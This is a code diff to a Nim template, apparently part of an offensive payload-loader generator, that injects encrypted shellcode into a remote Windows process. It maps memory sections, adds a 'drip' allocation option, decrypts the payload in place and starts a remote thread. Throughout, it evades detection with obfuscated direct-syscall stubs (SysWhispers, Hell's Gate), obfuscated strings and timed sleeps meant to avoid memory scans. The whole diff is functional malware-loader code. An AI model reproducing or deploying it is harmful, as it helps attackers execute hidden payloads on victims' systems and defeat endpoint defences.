@@ -6,7 +6,9 @@ let ShellcodeRemoteInjectMapSection * = """
             oldProtection: DWORD = 0
             status: NTSTATUS
             success: BOOL
-        
+            lpMapAddressRemote: PVOID = NULL
+            lpMapAddress: PVOID = NULL
+
         when defined(SysWhispers):
             when not defined(spawninject):
                 status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
@@ -14,57 +16,69 @@ let ShellcodeRemoteInjectMapSection * = """
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
 
-            # NtCreateSection Call
-            
-            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
-        
-            var 
-                hMapFile: HANDLE
-                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
+            when defined(AllocateDripStyle):
+                lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
+                if lpMapAddressRemote == nil:
+                    when defined(verbose):
+                        echo obf("[-] DripAllocation Failed")
+                    quit(1)
+                else:
+                    when defined(verbose):
+                        echo obf("[+] DripAllocation Success!")
+            else:
+                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
+                        
+                # NtCreateSection Call
+                
+                var 
+                    hMapFile: HANDLE
+                    sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
 
-            status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
-            when defined(verbose):
-                echo obf("[*] NtCreateSection: "), toHex(status)
-
-            var
-                lpMapAddress: PVOID = NULL
-                vSize: SIZE_T = sc_size
-            # NtMapViewOfSection Call local
-            status = uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
-
-            when defined(verbose):
-                echo obf("[*] NtMapViewOfSection: "), toHex(status)
-            if (lpMapAddress == nil):
-                echo obf("[-] Failed to map view of file")
-                echo GetLastError()
-
-            
-            var bytesWritten: SIZE_T
-            # NtWriteVirtualMemory Call
-            status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)
-
-            when defined(verbose):
-                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
-                echo obf("    \\-- bytes written: "), bytesWritten
-                echo obf("")
-            var lpMapAddressRemote: PVOID = NULL
-            
-            # NtMapViewOfSection Call remote
-            when defined(RX):
-                protectionValue = PAGE_EXECUTE_READ
-            
-            status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
-            
-            if (lpMapAddressRemote == nil):
-                echo obf("[-] Failed to map view of file remote")
-                echo toHex(status)
-            when defined(sleepinbetween):
+                status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
                 when defined(verbose):
-                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
-                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-            ptrEncText = cast[ptr byte](lpMapAddress)
-            ptrDecText = cast[ptr byte](lpMapAddress)
-            decryptlate()
+                    echo obf("[*] NtCreateSection: "), toHex(status)
+
+                var
+                    vSize: SIZE_T = sc_size
+                # NtMapViewOfSection Call local
+                status = uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+
+                when defined(verbose):
+                    echo obf("[*] NtMapViewOfSection: "), toHex(status)
+                if (lpMapAddress == nil):
+                    echo obf("[-] Failed to map view of file")
+                    echo GetLastError()
+                
+                echo obf("[*] Moving shellcode to memory...")
+                moveMemory(lpMapAddress, cast[pointer](unsafeAddr friendlycode), int(sc_size))                
+                
+                # Why did I use NtWrite here instead of local copy.. No one knows.
+                # var bytesWritten: SIZE_T
+                # NtWriteVirtualMemory Call
+                #status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)
+
+                #when defined(verbose):
+                #    echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                #    echo obf("    \\-- bytes written: "), bytesWritten
+                #    echo obf("")
+
+                
+                # NtMapViewOfSection Call remote
+                when defined(RX):
+                    protectionValue = PAGE_EXECUTE_READ
+                
+                status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
+                
+                if (lpMapAddressRemote == nil):
+                    echo obf("[-] Failed to map view of file remote")
+                    echo toHex(status)
+                when defined(sleepinbetween):
+                    when defined(verbose):
+                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                ptrEncText = cast[ptr byte](lpMapAddress)
+                ptrDecText = cast[ptr byte](lpMapAddress)
+                decryptlate()
             
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)
 
@@ -86,78 +100,76 @@ let ShellcodeRemoteInjectMapSection * = """
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
         
-            when defined(Hellsgate):
-                if getSyscall(ntCreateSectionTable):
-                    syscall = ntCreateSectionTable.wSysCall
+
+            when defined(AllocateDripStyle):
+                lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
+                if lpMapAddressRemote == nil:
+                    when defined(verbose):
+                        echo obf("[-] DripAllocation Failed")
+                    quit(1)
                 else:
                     when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtCreateSection")
+                        echo obf("[+] DripAllocation Success!")
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntCreateSectionTable):
+                        syscall = ntCreateSectionTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtCreateSection")
+                
+                # NtCreateSection Call
+                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
             
-            # NtCreateSection Call
-            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
-        
-            var 
-                hMapFile: HANDLE
-                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
+                var 
+                    hMapFile: HANDLE
+                    sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
 
-            status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
-            when defined(verbose):
-                echo obf("[*] NtCreateSection: "), toHex(status)
-            
-            if (hMapFile == 0):
-                echo obf("[-] Failed to create file mapping")
-                echo GetLastError()
-            
-            when defined(Hellsgate):
-                if getSyscall(ntMapViewOfSectionTable):
-                    syscall = ntMapViewOfSectionTable.wSysCall
-                else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")
-            
-            var
-                lpMapAddress: PVOID = NULL
-                vSize: SIZE_T = sc_size
+                status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
+                when defined(verbose):
+                    echo obf("[*] NtCreateSection: "), toHex(status)
+                
+                if (hMapFile == 0):
+                    echo obf("[-] Failed to create file mapping")
+                    echo GetLastError()
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntMapViewOfSectionTable):
+                        syscall = ntMapViewOfSectionTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
+                
+                var
+                    vSize: SIZE_T = sc_size
 
-            status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+                status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
 
-            when defined(verbose):
-                echo obf("[*] NtMapViewOfSection: "), toHex(status)
+                when defined(verbose):
+                    echo obf("[*] NtMapViewOfSection: "), toHex(status)
 
-            if (lpMapAddress == nil):
-                echo obf("[-] Failed to map view of file")
-                echo GetLastError()
-         
-            when defined(Hellsgate):
-                if getSyscall(ntWriteTable):
-                    syscall = ntWriteTable.wSysCall
-                else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                if (lpMapAddress == nil):
+                    echo obf("[-] Failed to map view of file")
+                    echo GetLastError()
             
-            var bytesWritten: SIZE_T
-            status = NtWriteVirtualMemory(
-                pHandle2, 
-                lpMapAddress, 
-                unsafeAddr friendlycode, 
-                sc_size, 
-                addr bytesWritten)
-            
-            when defined(Hellsgate):
-                if getSyscall(ntMapViewOfSectionTable):
-                    syscall = ntMapViewOfSectionTable.wSysCall
-                else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")
-            
-            when defined(RX):
-                protectionValue = PAGE_EXECUTE_READ
-            var lpMapAddressRemote: PVOID = NULL
-            status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
-            
-            if (lpMapAddressRemote == nil):
-                echo obf("[-] Failed to map view of file remote")
-                echo toHex(status)
+
+                echo obf("[*] Moving shellcode to memory...")
+                moveMemory(lpMapAddress, cast[pointer](unsafeAddr friendlycode), int(sc_size))  
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntMapViewOfSectionTable):
+                        syscall = ntMapViewOfSectionTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
+                
+                when defined(RX):
+                    protectionValue = PAGE_EXECUTE_READ
+                status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
+                
+                if (lpMapAddressRemote == nil):
+                    echo obf("[-] Failed to map view of file remote")
+                    echo toHex(status)
             
             when defined(QueueAPC):
                 # first create the sleep Thread before sleeping in between, because that could trigger memory scans
@@ -167,6 +179,9 @@ let ShellcodeRemoteInjectMapSection * = """
                 when defined(verbose):
                     echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+            
+            when defined(AllocateDripStyle):
+                lpMapAddress = decryptbuffer
             ptrEncText = cast[ptr byte](lpMapAddress)
             ptrDecText = cast[ptr byte](lpMapAddress)
             when defined(Hellsgate):
